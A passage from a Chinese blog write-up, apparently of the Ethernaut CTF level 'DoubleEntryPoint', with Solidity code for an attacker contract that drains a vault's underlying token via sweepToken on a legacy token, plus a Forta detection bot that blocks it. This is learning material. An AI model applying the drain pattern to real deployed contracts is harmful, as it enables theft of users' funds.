IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 4. 创建一个新的题目instance</span><br><span class="line">// 5. 用EOA账户调用新实例的IForta的setDetectionBot()设置报警机器人</span><br><span class="line">// 6. 完成</span><br></pre></td></tr></table></figure>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>完整代码如下，根据代码中的序号一步一步调用即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address) external;</span><br><span class="line">    function notify(address , bytes calldata ) external;</span><br><span class="line">    function raiseAlert(address ) external;</span><br><span class="line">&#125; // 报警机器人</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address, bytes calldata ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ICryptoVault&#123;</span><br><span class="line">    function sweepToken(address) external;</span><br><span class="line">    function underlying() external view returns(address);</span><br><span class="line">&#125; // 金库</span><br><span class="line"></span><br><span class="line">interface ILegacyToken &#123; &#125; // 垃圾币</span><br><span class="line"></span><br><span class="line">interface IDoubleEntryPoint &#123;</span><br><span class="line">    function cryptoVault() external view returns(address);</span><br><span class="line">    function delegatedFrom() external view returns(address);</span><br><span class="line">    function forta() external view returns(address);</span><br><span class="line">&#125; // 底层币</span><br><span class="line"></span><br><span class="line">// 1. 获取一个实例，尝试是否可以攻击成功</span><br><span class="line">contract attaker&#123;</span><br><span class="line">    IDoubleEntryPoint instance; // 题目实例</span><br><span class="line">    IForta forta; // 报警机器人</span><br><span class="line">    IDoubleEntryPoint DET; // 底层币</span><br><span class="line">    ILegacyToken LGT; // 垃圾币</span><br><span class="line">    ICryptoVault vault; // 金库</span><br><span class="line"></span><br><span class="line">    constructor(IDoubleEntryPoint _addr) public &#123;</span><br><span class="line">        // 初始化题目信息</span><br><span class="line">        instance = _addr;</span><br><span class="line">        vault = ICryptoVault(instance.cryptoVault());</span><br><span class="line">        DET = IDoubleEntryPoint(vault.underlying());</span><br><span class="line">        LGT = ILegacyToken(instance.delegatedFrom());</span><br><span class="line">        forta = IForta(instance.forta());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_stealDET() public &#123; // 2.我们来尝试一下是否可以攻击成功</span><br><span class="line">        vault.sweepToken(address(LGT));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 3. 用玩家EOA账号部署一个MyRobot</span><br><span class="line">contract MyRobot is IDetectionBot &#123;</span><br><span class="line">    ICryptoVault vault;</span><br><span class="line"></span><br><span class="line">    constructor(ICryptoVault _addr) public &#123;</span><br><span class="line">        vault = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == address(vault)) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 4. 创建一个新的题目instance</span><br><span class="line">// 5. 用EOA账户调用新实例的IForta的setDetectionBot()设置报警机器人</span><br><span class="line">// 6. 完成</span><br></pre></td></tr></table></figure>
+<p>给出攻击的流程：</p>
+<p><img src="https://moe.photo/images/2023/07/19/image-20230719202515103.png" alt></p>
+<p>成功</p>
+<p><img src="https://moe.photo/images/2023/07/19/image-20230719181008465.png" alt></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/07/19/04.Ethernaut%20CTF/25.Motobike/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-07-19 15:26:29
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
+                        <b>#</b> 04.Ethernaut CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DoublicEntryPoint"><span class="toc-text">DoublicEntryPoint</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80%E8%A7%82"><span class="toc-text">1.全局观</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-text">2.详细分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.寻找漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%81%9A%E5%87%BA%E9%98%B2%E5%BE%A1"><span class="toc-text">4.做出防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 26.DoublicEntryPoint + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F19%2F04.Ethernaut%2520CTF%2F26.DoublicEntryPoint%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/19/04.Ethernaut%20CTF/26.DoublicEntryPoint/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
